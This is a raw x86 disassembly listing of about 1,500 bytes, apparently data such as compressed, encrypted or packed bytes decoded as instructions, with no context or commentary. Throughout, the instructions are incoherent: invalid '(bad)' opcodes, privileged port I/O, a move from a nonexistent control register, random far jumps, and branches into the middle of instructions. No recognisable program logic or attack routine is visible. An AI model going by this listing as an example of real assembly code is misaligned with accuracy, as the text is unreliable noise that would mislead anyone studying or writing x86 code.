  419a6d:	mov    ah,0x81
  419a6f:	add    DWORD PTR [ecx+0x5074eb24],0xfffffff3
  419a76:	fdiv   DWORD PTR [edi+0x54]
  419a79:	mov    edi,DWORD PTR [esi+ebp*4]
  419a7c:	sti    
  419a7d:	xlat   BYTE PTR ds:[ebx]
  419a7e:	cmp    al,BYTE PTR [eax+0x6f2cb17]
  419a84:	sub    BYTE PTR [eax-0x4],dl
  419a87:	dec    ebx
  419a88:	and    ch,bh
  419a8a:	mov    al,0x57
  419a8c:	jns    0x419a0e
  419a8e:	jecxz  0x419ad1
  419a90:	je     0x419b05
  419a92:	test   al,0x65
  419a94:	push   edi
  419a95:	int3   
  419a96:	mov    ecx,0x7e1c9fd0
  419a9b:	push   cs
  419a9c:	addr16 push cs
  419a9e:	in     al,dx
  419a9f:	loopne 0x419a40
  419aa1:	xchg   ebp,ebp
  419aa3:	pop    ebx
  419aa4:	pop    esi
  419aa5:	xchg   esi,eax
  419aa6:	(bad)  
  419aa7:	clc    
  419aa8:	mov    esi,0xeba1a1d2
  419aad:	out    dx,eax
  419aae:	jmp    0xe24f:0xce237f75
  419ab5:	dec    edx
  419ab6:	imul   esp,DWORD PTR [eax+0xb7b1e73],0x32819f5
  419ac0:	(bad)  
  419ac2:	clc    
  419ac3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ac4:	jo     0x419a4f
  419ac6:	jb     0x419aa2
  419ac8:	jns    0x419ae7
  419aca:	mov    ds:0x15347670,al
  419acf:	sub    DWORD PTR [edx+0x151cee96],edx
  419ad5:	adc    BYTE PTR [esi+ecx*8+0x2c1efc2c],dh
  419adc:	(bad)  
  419ade:	mov    ebp,0x28b48d85
  419ae3:	push   0xffffffe9
  419ae5:	and    al,0xc1
  419ae7:	jp     0x419a6d
  419ae9:	and    DWORD PTR [ebx+0x2bc41ec8],esi
  419aef:	jo     0x419b1d
  419af1:	ret    
  419af2:	aad    0x7
  419af4:	cmp    ah,BYTE PTR [ebp+edi*2+0x17]
  419af8:	jno    0x419b76
  419afa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419afb:	sub    DWORD PTR [edi+eax*1],ebp
  419afe:	mov    ecx,0x56499115
  419b03:	in     al,0x73
  419b05:	adc    eax,0x459a0857
  419b0a:	aas    
  419b0b:	and    BYTE PTR [esp+esi*8],bl
  419b0e:	and    al,0xf7
  419b10:	loope  0x419b29
  419b12:	outs   dx,DWORD PTR ds:[esi]
  419b13:	stc    
  419b14:	cmp    cl,BYTE PTR [ecx-0x2c]
  419b17:	add    ebp,edx
  419b19:	mov    edi,0xd4b0c42e
  419b1e:	and    esi,edx
  419b20:	xor    BYTE PTR [ebx-0x75],ch
  419b23:	repz add BYTE PTR [esi],bh
  419b26:	push   es
  419b27:	sbb    BYTE PTR [edi+0x6951db77],0x59
  419b2e:	xchg   edx,eax
  419b2f:	lea    edi,[esi+0x67]
  419b32:	cwde   
  419b33:	and    bh,BYTE PTR [ebx+0x6def3b35]
  419b39:	pop    ds
  419b3a:	ret    
  419b3b:	xor    ah,dl
  419b3d:	in     al,0x82
  419b3f:	sub    al,0xe0
  419b41:	daa    
  419b42:	fadd   QWORD PTR [edi]
  419b44:	imul   esp,DWORD PTR [edi-0x6fbf3a78],0xe1165cd4
  419b4e:	bound  esp,QWORD PTR [esi]
  419b50:	stos   DWORD PTR es:[edi],eax
  419b51:	mov    BYTE PTR [esi+0x31e4708f],ah
  419b57:	sub    esp,DWORD PTR [edx]
  419b59:	push   ds
  419b5a:	push   ecx
  419b5b:	mov    WORD PTR [di+0x2661],fs
  419b60:	imul   ebx,ebp,0xffffffff
  419b63:	and    BYTE PTR [edx+0x41],0x70
  419b67:	sub    DWORD PTR [eax+ebx*2+0x6d],ecx
  419b6b:	cmp    eax,0xf3a9516b
  419b70:	push   ecx
  419b71:	mov    edi,0x4fea79d1
  419b76:	sbb    esi,DWORD PTR [eax]
  419b78:	fistp  DWORD PTR [eax]
  419b7a:	mov    edi,0xadb525e8
  419b7f:	mov    ch,0x29
  419b81:	shl    DWORD PTR [edi+0x78d7d66b],1
  419b87:	sub    DWORD PTR [edx],0x2de56c28
  419b8d:	jmp    0x419b37
  419b8f:	push   eax
  419b90:	(bad)  ds:[edi-0x20ab1dee]
  419b97:	inc    esi
  419b98:	lea    esp,[ebx+0xc]
  419b9b:	xchg   ecx,eax
  419b9c:	inc    esp
  419b9d:	xchg   esp,ebp
  419b9f:	idiv   BYTE PTR [ecx+0x44]
  419ba2:	add    eax,0x4fee326c
  419ba7:	sub    al,0x89
  419ba9:	xor    al,0x21
  419bab:	es out dx,al
  419bad:	cs pop ss
  419baf:	stos   BYTE PTR es:[edi],al
  419bb0:	fisubr WORD PTR ds:0xb25e4a3d
  419bb6:	push   ebx
  419bb7:	(bad)  
  419bb8:	mov    ebx,DWORD PTR [esi-0x73]
  419bbb:	pop    esi
  419bbc:	push   esi
  419bbd:	cmp    BYTE PTR [esp+edx*4],cl
  419bc0:	and    eax,0x62569059
  419bc5:	out    0x1b,al
  419bc7:	add    BYTE PTR [ebp+ebx*2-0x7a55dc85],dl
  419bce:	mov    ch,0xc4
  419bd0:	pop    ds
  419bd1:	push   esp
  419bd2:	mov    dh,0x88
  419bd4:	mov    cl,0x3b
  419bd6:	adc    edx,edx
  419bd8:	dec    ebp
  419bd9:	push   ds
  419bda:	inc    ebx
  419bdb:	fcomi  st,st(2)
  419bdd:	and    bh,ah
  419bdf:	adc    eax,esp
  419be1:	cmp    esp,esi
  419be3:	sahf   
  419be4:	iret   
  419be5:	inc    edx
  419be6:	cmp    al,cl
  419be8:	xor    DWORD PTR [esp+eiz*4-0x6e],edi
  419bec:	xor    ebx,DWORD PTR [edx-0x23689a57]
  419bf2:	bnd jp 0x419c31
  419bf5:	xor    DWORD PTR [edi],0xc28a28f
  419bfb:	or     eax,0xfed0ec29
  419c00:	out    dx,eax
  419c01:	in     al,0x2b
  419c03:	mov    bh,0xd2
  419c05:	pop    edx
  419c06:	and    bl,BYTE PTR [esi]
  419c08:	mov    ds:0x55de78bf,al
  419c0d:	std    
  419c0e:	and    eax,0x2cecee14
  419c13:	js     0x419c7e
  419c15:	out    dx,al
  419c16:	dec    eax
  419c17:	mov    esp,0xae598561
  419c1c:	retf   0xa896
  419c1f:	push   cs
  419c20:	add    al,0xc5
  419c22:	push   0x66c1a5ab
  419c27:	gs dec eax
  419c29:	paddusb mm0,QWORD PTR [edx-0x33feac20]
  419c30:	pavgb  mm1,mm0
  419c33:	pop    ebp
  419c34:	or     al,0xac
  419c36:	and    BYTE PTR ss:[edx],cl
  419c39:	sbb    eax,0xdb3a8597
  419c3e:	xchg   esi,ebx
  419c40:	cmp    DWORD PTR [esi-0x13c1fb9c],ebp
  419c46:	mov    ds:0x610eff7b,al
  419c4b:	test   BYTE PTR [ecx+eiz*8+0x37],dh
  419c4f:	adc    bh,BYTE PTR [ecx+0x4dc7797]
  419c55:	lods   al,BYTE PTR ds:[esi]
  419c56:	mov    DWORD PTR [eax+esi*1-0x726842a3],esp
  419c5d:	jle    0x419cd6
  419c5f:	push   esp
  419c60:	inc    ecx
  419c61:	stc    
  419c62:	mov    ds:0x83440571,al
  419c67:	mul    DWORD PTR [edi+0x2d]
  419c6a:	add    dh,BYTE PTR [ecx]
  419c6c:	scas   al,BYTE PTR es:[edi]
  419c6d:	mov    ebp,0xfe2206c0
  419c72:	jns    0x419c35
  419c74:	pop    esp
  419c75:	push   ss
  419c76:	and    eax,0x37316ab2
  419c7b:	ret    0x4e58
  419c7e:	adc    edi,DWORD PTR [ebx+0x25]
  419c81:	add    eax,ebp
  419c83:	jl     0x419c65
  419c85:	mov    al,0x2
  419c87:	mov    ecx,0x9d315d19
  419c8c:	mov    esi,0x6868c001
  419c91:	sbb    dh,BYTE PTR [ecx]
  419c93:	lods   eax,DWORD PTR ds:[esi]
  419c94:	push   esp
  419c95:	fimul  WORD PTR [ebp-0x3e423adb]
  419c9b:	retf   
  419c9c:	push   esp
  419c9d:	lds    edi,FWORD PTR [eax]
  419c9f:	mov    ?,WORD PTR [ebx+0x2e]
  419ca2:	add    eax,0x5499265
  419ca7:	push   0xf55b0cdd
  419cac:	shr    ah,cl
  419cae:	test   BYTE PTR [ebp+0x570f6d59],al
  419cb4:	inc    edi
  419cb5:	ret    0x5ccb
  419cb8:	fld    DWORD PTR [esi+0x51b0e7c0]
  419cbe:	fisubr WORD PTR [edx+0x2b10d4e4]
  419cc4:	pop    ecx
  419cc5:	test   al,0x6e
  419cc7:	test   eax,0xcb73338b
  419ccc:	test   al,0x95
  419cce:	jb     0x419cef
  419cd0:	xor    al,0x2b
  419cd2:	in     eax,0xb5
  419cd4:	or     al,0x45
  419cd6:	mov    dl,0x70
  419cd8:	(bad)  [esi-0x666fdcc9]
  419cde:	xor    DWORD PTR [ecx+0x694fb272],edx
  419ce4:	cmp    esi,DWORD PTR [edi]
  419ce6:	sub    eax,0x31efa478
  419ceb:	mov    bh,BYTE PTR cs:[ecx+0xeea8407]
  419cf2:	les    eax,FWORD PTR ss:[edi+0x71]
  419cf6:	pop    esi
  419cf7:	xchg   BYTE PTR [edi+esi*2],dh
  419cfa:	lods   al,BYTE PTR ds:[esi]
  419cfb:	adc    ecx,edx
  419cfd:	mov    esp,0x14928023
  419d02:	xor    dl,BYTE PTR [eax]
  419d04:	adc    DWORD PTR [ebx],eax
  419d06:	add    ebx,esi
  419d08:	add    eax,0x3c6cc98e
  419d0d:	add    bl,cl
  419d0f:	(bad)  
  419d10:	pop    ebp
  419d11:	cld    
  419d12:	std    
  419d13:	pop    edi
  419d14:	pop    ss
  419d15:	xor    eax,0x924fbd09
  419d1a:	jnp    0x419d28
  419d1c:	dec    esi
  419d1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d1e:	lods   al,BYTE PTR ds:[esi]
  419d1f:	inc    edx
  419d20:	pop    ds
  419d21:	mov    dl,0x83
  419d23:	jl     0x419cc0
  419d25:	mov    esp,DWORD PTR [esi+0x27]
  419d28:	jecxz  0x419da6
  419d2a:	inc    ecx
  419d2b:	imul   edx,DWORD PTR [edx],0x34
  419d2e:	out    dx,al
  419d2f:	lahf   
  419d30:	repz dec ecx
  419d32:	pop    eax
  419d33:	sub    eax,0xd6e4523c
  419d38:	cmc    
  419d39:	and    dh,BYTE PTR [eax+0x779a7425]
  419d3f:	aaa    
  419d40:	sar    dh,cl
  419d42:	test   DWORD PTR [ebp+0x55b0669d],edi
  419d48:	inc    ebx
  419d49:	in     al,dx
  419d4a:	xchg   ebp,eax
  419d4b:	jno    0x419d4d
  419d4d:	sub    eax,0x78b527d3
  419d52:	ins    BYTE PTR es:[edi],dx
  419d53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d54:	(bad)  
  419d55:	std    
  419d56:	push   edx
  419d57:	inc    esi
  419d58:	shl    DWORD PTR [ebx],0x8c
  419d5b:	and    BYTE PTR [edx],dh
  419d5d:	in     al,0xed
  419d5f:	test   DWORD PTR [ebp+eax*8+0x71],ebp
  419d63:	frstor [ecx]
  419d65:	jnp    0x419de2
  419d67:	dec    ecx
  419d68:	jecxz  0x419d36
  419d6a:	lds    ebp,FWORD PTR [ecx+0x20dab745]
  419d70:	clc    
  419d71:	js     0x419d55
  419d73:	add    al,0xb7
  419d75:	or     ah,0x98
  419d78:	adc    DWORD PTR [edi-0x3c962ac5],ebx
  419d7e:	ss nop
  419d80:	sti    
  419d81:	cmp    DWORD PTR [esi+0x29851af4],eax
  419d87:	dec    ebp
  419d88:	aam    0x5f
  419d8a:	in     al,0x3d
  419d8c:	jne    0x419e0b
  419d8e:	jl     0x419e0a
  419d90:	gs dec esi
  419d92:	pop    ds
  419d93:	test   eax,0xae504163
  419d98:	les    ebx,FWORD PTR [edi-0x52]
  419d9b:	xlat   BYTE PTR ds:[ebx]
  419d9c:	lds    eax,FWORD PTR [edi]
  419d9e:	je     0x419dab
  419da0:	sbb    esp,DWORD PTR [edi]
  419da2:	sub    eax,0x9966c9b7
  419da8:	aad    0x41
  419daa:	lods   eax,DWORD PTR ds:[esi]
  419dab:	mov    dl,0x7b
  419dad:	mov    ecx,0x70e79201
  419db2:	leave  
  419db3:	xchg   esi,eax
  419db4:	out    dx,al
  419db5:	jns    0x419dd3
  419db7:	mov    esi,0xecd3f959
  419dbc:	xchg   ecx,eax
  419dbd:	cmp    eax,0xd527a2e1
  419dc2:	sbb    BYTE PTR [eax],0x17
  419dc5:	xor    esp,DWORD PTR ds:0x71991700
  419dcb:	popa   
  419dcc:	lock cmp ecx,edi
  419dcf:	or     bl,BYTE PTR [ebp-0x42a06465]
  419dd5:	mov    ebp,edi
  419dd7:	xchg   edi,eax
  419dd8:	dec    ecx
  419dd9:	push   ds
  419dda:	loopne 0x419d74
  419ddc:	add    edi,DWORD PTR [edi]
  419dde:	mov    edi,cr7
  419de1:	scas   eax,DWORD PTR es:[edi]
  419de2:	mov    fs,WORD PTR [eax-0x6f]
  419de5:	push   ss
  419de6:	and    eax,edi
  419de8:	in     al,0x7a
  419dea:	shl    DWORD PTR [edx-0x29],1
  419ded:	in     al,dx
  419dee:	jge    0x419d94
  419df0:	test   DWORD PTR [ecx],ebp
  419df2:	mov    ds:0xf3a72ea4,eax
  419df7:	bswap  ebp
  419df9:	and    BYTE PTR [ecx-0xd],al
  419dfc:	jg     0x419e29
  419dfe:	jns    0x419dcf
  419e00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e01:	inc    eax
  419e02:	fist   WORD PTR [esi-0x76]
  419e05:	or     eax,0xb046bb97
  419e0a:	ja     0x419e30
  419e0c:	call   0x9f9:0xad97c8b2
  419e13:	push   edi
  419e14:	test   eax,0x6af49674
  419e19:	add    edx,DWORD PTR [esp+edi*1+0x214e699a]
  419e20:	pop    es
  419e21:	test   eax,0xca8e4d0c
  419e26:	mov    eax,0xecc2d551
  419e2b:	push   edx
  419e2c:	add    ecx,edi
  419e2e:	fcomp  DWORD PTR gs:[edi+edi*1]
  419e32:	(bad)  
  419e33:	adc    dh,BYTE PTR [ebx]
  419e35:	mov    ebp,0xef97a367
  419e3a:	cmp    al,0xb
  419e3c:	push   esp
  419e3d:	outs   dx,BYTE PTR ds:[esi]
  419e3e:	cmp    ah,BYTE PTR [ebp+0x64]
  419e41:	std    
  419e42:	inc    edi
  419e43:	cmp    ebp,ebp
  419e45:	cmp    ch,BYTE PTR [edx+0x69]
  419e48:	xor    DWORD PTR [edi],esi
  419e4a:	not    BYTE PTR [esi-0x2c0fb59b]
  419e50:	lods   eax,DWORD PTR ds:[esi]
  419e51:	add    BYTE PTR [ebp-0x77baeeab],bl
  419e57:	inc    edx
  419e58:	inc    esp
  419e59:	shl    DWORD PTR [ecx+0x39],cl
  419e5c:	les    edi,FWORD PTR [ebp-0x38]
  419e5f:	add    al,bl
  419e61:	mov    ds:0x40727d57,al
  419e66:	xor    cl,dl
  419e68:	icebp  
  419e69:	ins    BYTE PTR es:[edi],dx
  419e6a:	sub    eax,0x917b898d
  419e6f:	repz aad 0x82
  419e72:	pop    ebp
  419e73:	test   BYTE PTR [ebp-0x8],dl
  419e76:	call   FWORD PTR [ebx-0x65]
  419e79:	jo     0x419eed
  419e7b:	sahf   
  419e7c:	hlt    
  419e7d:	push   ds
  419e7e:	mov    dl,0x13
  419e80:	ins    BYTE PTR es:[edi],dx
  419e81:	adc    BYTE PTR [ecx+eax*8-0x56],dh
  419e85:	jp     0x419e77
  419e87:	push   0x69
  419e89:	jno    0x419ec3
  419e8b:	mov    al,0x3d
  419e8d:	xchg   ebp,eax
  419e8e:	outs   dx,BYTE PTR ds:[esi]
  419e8f:	(bad)  
  419e90:	in     al,dx
  419e91:	jle    0x419f0b
  419e93:	or     dl,dl
  419e95:	in     al,0x61
  419e97:	pop    esi
  419e98:	mov    DWORD PTR [ebx-0x19],edx
  419e9b:	test   DWORD PTR [esi+0x47ff44d2],ebp
  419ea1:	(bad)  
  419ea2:	and    eax,0xd7cb1c50
  419ea7:	xchg   cl,ah
  419ea9:	fdivp  st(5),st
  419eab:	ds mov ch,0xa6
  419eae:	and    dh,BYTE PTR [ecx-0x431abf5b]
  419eb4:	mov    esp,DWORD PTR [esi+0x56]
  419eb7:	xchg   ebx,eax
  419eb8:	(bad)  
  419eb9:	cli    
  419eba:	add    DWORD PTR [edi-0x3f],ebp
  419ebd:	pop    esi
  419ebe:	pusha  
  419ebf:	push   edx
  419ec0:	and    DWORD PTR [edx],ebx
  419ec2:	and    bl,BYTE PTR [ecx-0x59f53c30]
  419ec8:	dec    ebx
  419ec9:	mov    edi,0x43043084
  419ece:	pusha  
  419ecf:	add    al,BYTE PTR [ecx+0x67]
  419ed2:	xchg   ebp,eax
  419ed3:	sbb    BYTE PTR [eax-0xe5b8636],dl
  419ed9:	jne    0x419e68
  419edb:	js     0x419eca
  419edd:	adc    ebx,DWORD PTR [ebx-0x66]
  419ee0:	imul   edi,DWORD PTR [edx-0x24],0x69197455
  419ee7:	ds xor al,0x5c
  419eea:	add    DWORD PTR [eax-0x1428a9fb],0xf926a4bd
  419ef4:	push   ss
  419ef5:	popa   
  419ef6:	out    dx,eax
  419ef7:	and    DWORD PTR [esi],0x5c
  419efa:	and    BYTE PTR [edx],cl
  419efc:	pop    esp
  419efd:	gs jecxz 0x419f5e
  419f00:	sub    al,0xc0
  419f02:	push   edi
  419f03:	fwait
  419f04:	inc    edi
  419f05:	sbb    BYTE PTR [ebx],0x5a
  419f08:	popf   
  419f09:	test   DWORD PTR [esi+0x70],esp
  419f0c:	jmp    0x3f928854
  419f11:	fisttp DWORD PTR [edx+0x32]
  419f14:	lea    edi,[ebx-0x30]
  419f17:	dec    ebp
  419f18:	fwait
  419f19:	call   0x9795b034
  419f1e:	fstp   QWORD PTR [ebp-0x21]
  419f21:	sbb    DWORD PTR [eax+0x3b8ce33d],0xffffffeb
  419f28:	jno    0x419f48
  419f2a:	(bad)  
  419f2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f2d:	lods   eax,DWORD PTR ds:[esi]
  419f2e:	sbb    ebp,DWORD PTR [esi+0x46e52416]
  419f34:	mov    esp,esp
  419f36:	cmp    bh,0x20
  419f39:	imul   esp,DWORD PTR [ebp+0x2],0x72406bbd
  419f40:	in     eax,0x32
  419f42:	cli    
  419f43:	adc    BYTE PTR [ebp-0x6],ah
  419f46:	xor    eax,0xa66fb8c3
  419f4b:	aas    
  419f4c:	imul   ebp,ebx,0xfffffffe
  419f4f:	iret   
  419f50:	mov    edi,0xa9ab027
  419f55:	das    
  419f56:	or     esp,esp
  419f58:	push   edx
  419f59:	xor    eax,DWORD PTR [eax+0x3e6cb126]
  419f5f:	mov    dh,0x54
  419f61:	iret   
  419f62:	cmp    bl,BYTE PTR [edx+0x5e48da1c]
  419f68:	add    al,0x26
  419f6a:	cmp    al,0xa6
  419f6c:	mov    al,ds:0x1293bee
  419f71:	enter  0xb5a3,0x39
  419f75:	shl    BYTE PTR ds:0xf4492ed0,cl
  419f7b:	and    eax,0x6a738a1d
  419f80:	xor    DWORD PTR [ecx+0x4],0xffffffa1
  419f84:	and    eax,0x2d9b1810
  419f89:	xchg   ebx,eax
  419f8a:	ret    0xffb1
  419f8d:	sub    eax,0xc0a48cff
  419f92:	imul   edx,edx,0x26
  419f95:	test   al,0xf4
  419f97:	adc    al,0xf3
  419f99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f9a:	xchg   edx,eax
  419f9b:	pop    eax
  419f9c:	stc    
  419f9d:	imul   eax,DWORD PTR ds:0x9edcb6ba,0xffffff99
  419fa4:	rol    DWORD PTR [ebx],1
  419fa6:	inc    ebp
  419fa7:	sbb    BYTE PTR [ecx+edx*1+0x471dae95],ah
  419fae:	cmp    ebx,DWORD PTR ds:0x82ec90ce
  419fb4:	jp     0x419fec
  419fb6:	cmp    al,0x36
  419fb8:	test   DWORD PTR [ebx],edi
  419fba:	cwde   
  419fbb:	inc    eax
  419fbc:	daa    
  419fbd:	(bad)  
  419fbe:	iret   
  419fbf:	jns    0x419faa
  419fc1:	and    eax,0xf723b8cd
  419fc6:	into   
  419fc7:	mov    cl,0xd6
  419fc9:	cmc    
  419fca:	mov    WORD PTR [edi-0x73024b60],?
  419fd0:	and    BYTE PTR [esi-0x1c],bh
  419fd3:	sbb    edi,ecx
  419fd5:	fstp   DWORD PTR [eax-0x70]
  419fd8:	or     al,0x5b
  419fda:	mov    dh,0xae
  419fdc:	stc    
  419fdd:	jbe    0x419f6d
  419fdf:	psraw  mm4,QWORD PTR [esi-0xf]
  419fe3:	aaa    
  419fe4:	fidivr DWORD PTR [eax+eax*8-0x9]
  419fe8:	cmp    dh,al
  419fea:	jo     0x419fe2
  419fec:	lahf   
  419fed:	mov    al,ds:0xd167b6db
  419ff2:	sbb    al,0x5a
  419ff4:	loop   0x41a00a
  419ff6:	daa    
  419ff7:	icebp  
  419ff8:	(bad)  
  419ff9:	pop    DWORD PTR [edx+0x4ce5f39f]
  419fff:	jno    0x41a07f
  41a001:	icebp  
  41a002:	rol    DWORD PTR [ebx],0xcf
  41a005:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a006:	sbb    DWORD PTR [ecx+0x51],0xc19ec03c
  41a00d:	call   0xeba0b6dd
  41a012:	pop    ss
  41a013:	xchg   edx,eax
  41a014:	mov    ebx,DWORD PTR [ebp+0x4c]
  41a017:	jle    0x41a083
  41a019:	dec    DWORD PTR [edx]
  41a01b:	inc    esp
  41a01c:	mov    dh,0x7a
  41a01e:	xchg   ecx,eax
  41a01f:	xor    DWORD PTR [ebx+0x7b],0xffffffd6
  41a023:	test   BYTE PTR [eax+0x56],bl
  41a026:	add    DWORD PTR ds:0x1b8d3ae3,edi
  41a02c:	(bad)  
  41a02d:	test   bl,ah
  41a02f:	cwde   
  41a030:	jmp    0x41a05d
  41a032:	mov    ds:0x10722364,eax
  41a037:	sub    eax,0x46857a69
  41a03c:	sbb    BYTE PTR [ebx-0x61],ch
  41a03f:	sbb    cl,BYTE PTR [edx-0x3fcc162d]
  41a045:	cld    
  41a046:	xor    eax,0x5cb11115
  41a04b:	ret    0xaa57
  41a04e:	enter  0xabeb,0x6a
  41a052:	call   0xaea5:0x8104f0a9
  41a059:	pop    esp
  41a05a:	sub    al,BYTE PTR [ebx]
  41a05c:	push   ds
  41a05d:	cdq    
  41a05e:	es push cs
  41a060:	push   edi
  41a061:	test   DWORD PTR [edx],esi
  41a063:	inc    esi
  41a064:	imul   edx,eax,0x145a04e9
  41a06a:	pop    ecx
  41a06b:	fdiv   QWORD PTR [edx+0x553768a8]
  41a071:	sbb    al,0x6c
  41a073:	push   ecx
  41a074:	jns    0x41a090
  41a076:	in     eax,dx
  41a077:	or     al,0xe3
  41a079:	add    bh,BYTE PTR [ecx+0x3c]
  41a07c:	stc    
  41a07d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a07e:	popf   
  41a07f:	into   
  41a080:	lods   eax,DWORD PTR ds:[esi]
  41a081:	jne    0x41a0e2
  41a083:	pop    ecx
  41a084:	cmp    al,0xfd
  41a086:	sti    
  41a087:	imul   DWORD PTR [edx]
  41a089:	bound  ebx,QWORD PTR ds:0x3d4f4f3f
  41a08f:	pop    esp
  41a090:	inc    esi
  41a091:	outs   dx,BYTE PTR ds:[esi]
  41a092:	push   edi
  41a093:	mov    ch,0xd7
  41a095:	jb     0x41a07c
  41a097:	ror    DWORD PTR [esi+0x5440b0bb],1
  41a09d:	gs mov edi,0x1d71875e
  41a0a3:	mov    bl,0x4f
  41a0a5:	add    BYTE PTR [eax],0xdc
  41a0a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0a9:	ss lahf 
  41a0ab:	fistp  DWORD PTR [ebx-0x43]
  41a0ae:	scas   al,BYTE PTR es:[edi]
  41a0af:	sar    edi,1
  41a0b1:	cmp    al,0xe8
  41a0b3:	mov    bl,0xc7
  41a0b5:	sub    DWORD PTR ds:0x9b2d00ed,ebx
  41a0bb:	jbe    0x41a0cc
  41a0bd:	inc    edi
  41a0be:	iret   
  41a0bf:	push   esi
  41a0c0:	out    0xa0,al
  41a0c2:	mov    edi,0xb38be363
  41a0c7:	and    eax,0x292fd859
  41a0cc:	repnz rcr DWORD PTR [ebx-0x3f0140cf],0x70
  41a0d4:	cli    
  41a0d5:	or     cl,bl
  41a0d7:	(bad)  [eax-0x1fac2781]
  41a0dd:	and    eax,0xd7630309
  41a0e2:	cmp    eax,0x482b1b61
  41a0e7:	push   ebx
  41a0e8:	pop    ebx
  41a0e9:	sbb    DWORD PTR [edi+eiz*2+0x6a234cea],edi
  41a0f0:	gs jmp 0xd68f:0x177789e4
  41a0f8:	mov    edi,0x9dd50bbe
  41a0fd:	mov    dl,0x30
  41a0ff:	sub    al,0x99
  41a101:	ins    DWORD PTR es:[edi],dx
  41a102:	and    BYTE PTR [eax],dh
  41a104:	leave  
  41a105:	jl     0x41a094
  41a107:	lea    ebx,[edx]
  41a109:	nop
  41a10a:	mov    dl,ch
  41a10c:	mov    esp,0xa33ae479
  41a111:	xchg   edx,eax
  41a112:	lds    ecx,FWORD PTR ds:0x38d5fd95
  41a118:	jmp    DWORD PTR [esi+0x1120c14c]
  41a11e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a11f:	add    DWORD PTR [edx],0xf9ee6848
  41a125:	mov    edi,0xfab96b8e
  41a12a:	sub    DWORD PTR [eax+0x112b1e47],ebx
  41a130:	mov    esp,0xc1f435
  41a135:	out    0x23,eax
  41a137:	mov    edi,fs
  41a139:	xor    al,0x46
  41a13b:	or     eax,0xa34f66fa
  41a140:	add    esp,edx
  41a142:	jmp    0x41a18f
  41a144:	sbb    edi,DWORD PTR [ebx-0x60]
  41a147:	aam    0xfb
  41a149:	fwait
  41a14a:	pop    ebx
  41a14b:	aas    
  41a14c:	scas   al,BYTE PTR es:[edi]
  41a14d:	sbb    bl,dl
  41a14f:	jno    0x41a18a
  41a151:	adc    ebx,DWORD PTR [edi+0x5111275a]
  41a157:	pop    eax
  41a158:	aad    0x76
  41a15a:	shl    BYTE PTR [ebx],cl
  41a15c:	out    dx,eax
  41a15d:	nop
  41a15e:	pushf  
  41a15f:	cmp    DWORD PTR [ecx],ecx
  41a161:	je     0x41a17d
  41a163:	pop    edx
  41a164:	sbb    cl,0xb0
  41a167:	(bad)  
  41a168:	and    eax,0x34344f01
  41a16d:	sub    al,0xbd
  41a16f:	and    DWORD PTR [ebp+ebx*4+0x5e],esi
  41a173:	push   esi
  41a174:	fist   WORD PTR [eax+0x5c2beb93]
  41a17a:	xor    DWORD PTR [ebx+0x25],ecx
  41a17d:	cmp    BYTE PTR [ebp+0x2c],0x68
  41a181:	data16 lahf 
  41a183:	dec    esi
  41a184:	repz out dx,al
  41a186:	cld    
  41a187:	jns    0x41a12e
  41a189:	stos   DWORD PTR es:[edi],eax
  41a18a:	les    ebx,FWORD PTR [edx]
  41a18c:	and    DWORD PTR [ebx-0x4579fbbb],esi
  41a192:	fisttp QWORD PTR [ebx]
  41a194:	cld    
  41a195:	cmp    cl,dl
  41a197:	mov    eax,ds:0x1474e96f
  41a19c:	push   esp
  41a19d:	xchg   ebx,eax
  41a19e:	jne    0x41a1b3
  41a1a0:	je     0x41a143
  41a1a2:	push   0x33
  41a1a4:	aaa    
  41a1a5:	adc    dl,al
  41a1a7:	popa   
  41a1a8:	and    dl,BYTE PTR [ecx]
  41a1aa:	xor    BYTE PTR [ebx-0x5b],al
  41a1ad:	mov    cl,BYTE PTR [ecx+ecx*8]
  41a1b0:	fwait
  41a1b1:	std    
  41a1b2:	and    al,0x5f
  41a1b4:	mov    BYTE PTR [ebx-0x2f],bh
  41a1b7:	out    dx,eax
  41a1b8:	lods   al,BYTE PTR ds:[esi]
  41a1b9:	xchg   ecx,eax
  41a1ba:	mov    WORD PTR [esi+0x16],fs
  41a1bd:	lahf   
  41a1be:	push   edx
  41a1bf:	add    eax,0x65755c7c
  41a1c4:	dec    esp
  41a1c5:	js     0x41a22f
  41a1c7:	(bad)  
  41a1c8:	stos   DWORD PTR es:[edi],eax
  41a1c9:	and    eax,0x197870ee
  41a1ce:	ss scas eax,DWORD PTR es:[edi]
  41a1d0:	inc    edi
  41a1d1:	mov    ecx,0x7f8e72c9
  41a1d6:	pop    ebx
  41a1d7:	int    0xc2
  41a1d9:	add    eax,0x7690a058
  41a1de:	fisttp WORD PTR [ecx+eiz*8+0x38]
  41a1e2:	icebp  
  41a1e3:	xchg   ebx,eax
  41a1e4:	sahf   
  41a1e5:	lock xchg ebx,eax
  41a1e7:	inc    eax
  41a1e8:	in     al,dx
  41a1e9:	or     al,BYTE PTR [esi+0x384dbd0d]
  41a1ef:	imul   ecx,DWORD PTR [edi+0x24983233],0x565f96d5
  41a1f9:	ja     0x41a1bd
  41a1fb:	(bad)  
  41a1fc:	dec    eax
  41a1fd:	cmp    esp,0xc494c794
  41a203:	cmp    ch,0x98
  41a206:	fisttp QWORD PTR ds:0x6b893fe
  41a20c:	and    BYTE PTR [edx+0x76],ah
  41a20f:	push   ecx
  41a210:	jmp    0x41a23d
  41a212:	and    eax,0x456c9ead
  41a217:	out    0xb,eax
  41a219:	inc    ecx
  41a21a:	jae    0x41a279
  41a21c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a21d:	xchg   BYTE PTR [edi+0xb],dl
  41a220:	xor    bh,BYTE PTR [esi+ebx*2-0x7aec9776]
  41a227:	dec    edi
  41a228:	push   ebp
  41a229:	or     edx,DWORD PTR [esi+esi*8-0x465611a6]
  41a230:	hlt    
  41a231:	mov    ebp,0x204844fd
  41a236:	push   eax
